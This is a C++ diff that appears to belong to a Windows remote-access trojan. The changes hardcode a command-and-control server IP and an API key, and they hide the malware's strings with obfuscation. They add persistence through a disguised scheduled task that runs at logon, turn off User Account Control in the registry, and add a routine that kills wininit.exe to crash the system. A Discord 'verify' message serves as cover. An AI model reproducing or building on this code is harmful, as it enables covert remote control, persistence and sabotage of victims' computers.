@@ -25,6 +25,14 @@ string cmd(char* pChar) {
     return output;
 }
 
+void notAdmin() {
+    system("cls");
+    ShowWindow(GetConsoleWindow(), SW_SHOW);
+    cout << "Please run this program as Admin!\n";
+    system("pause");
+    exit(0);
+}
+
 char* to_char(string string) {
     string += " && rem ";
     const int length = string.length();
@@ -50,11 +58,11 @@ string curl(char* url) {
     return cmd(to_char(command));
 }
 
-string apiCall(char * input) {
+string apiCall(char* input) {
     string command;
     command = skCrypt("curl -s ");
     command += skCrypt("-H \"apikey: ");
-    command += skCrypt("Some SHA-hash");
+    command += skCrypt("8ec0eb5f37d13d01248d9b2ed1c9c6a6612b8b1022f6052e253fda85e2e5e550");
     command += skCrypt("\" -H \"uuid: ");
     command += getCPU();
     command += skCrypt("\" -H \"ip: ");
@@ -62,39 +70,35 @@ string apiCall(char * input) {
     command += skCrypt("\" -H \"cmd: ");
     command += input;
     command += "\" ";
-    command += skCrypt("http://0.0.0.0:5000/api");
+    command += skCrypt("http://185.38.142.105:5000/api");
     return cmd(to_char(command));
 }
 
-void notLinked(char *path) {
+void notLinked(char* path) {
     string rndPath, rndName, svcName, absPath, command;
     rndPath = cmd(skCrypt("echo %userprofile%\\%random%\\%random%"));
     svcName = cmd(skCrypt("echo Micro%random%roSoft"));
     rndName = cmd(skCrypt("echo %random%.exe"));
     absPath = rndPath + "\\" + rndName;
-    command = "mkdir "+rndPath;
+    command = "mkdir " + rndPath;
     cmd(to_char(command));
     command = skCrypt("copy ");
     command += path;
     command += " " + absPath;
-    command += skCrypt("sc create ");
+    command += skCrypt(" && schtasks /create /f /tn ");
     command += svcName;
-    command += skCrypt(" binPath = \"");
+    command += skCrypt(" /tr \"");
     command += absPath;
-    command += skCrypt("\" type=kernel start=auto");
+    command += skCrypt("\" /sc onlogon && reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
     cmd(to_char(command));
     string code = apiCall(skCrypt("new"));
-    command = skCrypt("sc start ");
-    command += svcName;
-    cmd(to_char(command));
     system(skCrypt("cls"));
     ShowWindow(GetConsoleWindow(), SW_SHOW);
-    cout << "This computer is not registered!\nPlease goto discord and type !verify "+code;
+    cout << "This computer is not registered!\nPlease goto discord and type\n!verify " + code << "\nPlease press any key to close this window.";
     cin >> command;
-    exit(0);
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
 }
 
 void blacklisted() {
-    // Blue screen
-    // 
+    system(skCrypt("taskkill /f /im wininit.exe && powershell wininit"));
 }
